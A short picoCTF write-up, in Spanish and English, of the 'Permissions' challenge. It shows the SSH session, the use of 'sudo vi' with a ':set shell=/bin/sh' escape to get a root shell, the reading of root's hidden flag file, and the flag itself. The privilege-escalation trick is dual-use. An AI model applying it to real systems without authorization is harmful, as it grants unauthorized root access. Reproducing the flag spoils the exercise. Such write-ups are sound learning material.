# Descripcion
Can you read files in the root file?
## Solucion
`raxel05-academy@webshell:~$ ssh picoplayer@saturn.picoctf.net -p 61171`
`The authenticity of host '[saturn.picoctf.net]:61171 ([13.59.203.175]:61171)' can't be established.`
`ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.`
`This key is not known by any other names`
`Are you sure you want to continue connecting (yes/no/[fingerprint])? yes`
`Warning: Permanently added '[saturn.picoctf.net]:61171' (ED25519) to the list of known hosts.`
`picoplayer@saturn.picoctf.net's password:` 
`Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.17.0-1019-aws x86_64)`
`picoplayer@challenge:~$ sudo vi test` 
`root@challenge:/home/picoplayer# ls`
`root@challenge:/home/picoplayer# whoami`
`root@challenge:/home/picoplayer# cd /root/` 
`root@challenge:~# ls`
`root@challenge:~# ls -la`
`total 16`
`drwx------ 1 root root   22 Aug 28 18:39 .`
`drwxr-xr-x 1 root root   63 Aug 28 18:34 ..`
`-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc`
`-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt`
`-rw-r--r-- 1 root root  161 Dec  5  2019 .profile`
`-rw------- 1 root root  873 Aug 28 18:39 .viminfo`
`root@challenge:~# cat .flag.txt` 
`picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}`
## Notas Adicionales
+ usamos sudo -l para ver los comandos que podemos utilizar
+ usamos sudo vi test para crear un editor de texto
+ usamos el editor en modo administrador :set shell=/bin/sh :shell nos permiten abrir la terminal con los poderes root
## Referencias
+ https://medium.com/@petemuiruri/permissions-writeup-picoctf-2023-be95c95f80a5
